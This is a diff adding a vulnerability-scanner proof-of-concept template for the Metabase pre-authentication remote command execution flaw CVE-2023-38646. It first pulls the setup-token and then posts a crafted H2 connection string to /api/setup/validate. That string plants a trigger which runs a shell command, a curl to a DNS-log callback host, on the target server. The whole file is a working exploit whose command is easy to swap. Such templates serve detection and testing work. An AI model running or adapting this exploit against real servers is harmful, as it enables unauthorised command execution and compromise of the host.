@@ -1,0 +1,35 @@
+id: poc-yaml-metabase-validate-rce
+info:
+  name: Metabase-validate-远程命令执行漏洞(CVE-2023-38646)
+  severity: critical
+  tags:
+  - DNSLOG
+  - 两高一弱
+  - rce
+  - CVE-2023-38646
+  finger: metabase
+variables:
+  reverse: new_dns_log()
+  reverseDomain: reverse.Domain()
+requests:
+- method: GET
+  path: /api/session/properties
+  expression: status_code == 200 && contains(body, "setup-token")
+  output:
+  - regex_match(body, "\"setup-token\":\"(?P<token>.*?)\"")
+- method: POST
+  path: /api/setup/validate
+  headers:
+    Content-Type: application/json
+  data: "{\n    \"token\": \"{{.token}}\",\n    \"details\":\n    {\n        \"is_on_demand\"\
+    : false,\n        \"is_full_sync\": false,\n        \"is_sample\": false,\n  \
+    \      \"cache_ttl\": null,\n        \"refingerprint\": false,\n        \"auto_run_queries\"\
+    : true,\n        \"schedules\": {},\n        \"details\":\n        {\n       \
+    \     \"db\": \"zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\\
+    \\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\\\
+    njava.lang.Runtime.getRuntime().exec('curl {{.reverseDomain}}')\\n$$--=x\",\n\
+    \            \"advanced-options\": false,\n            \"ssl\": true\n       \
+    \ },\n        \"name\": \"an-sec-research-team\",\n        \"engine\": \"h2\"\n\
+    \    }\n}\n"
+  expression: status_code == 400 && reverse.Verify()
+transport: http
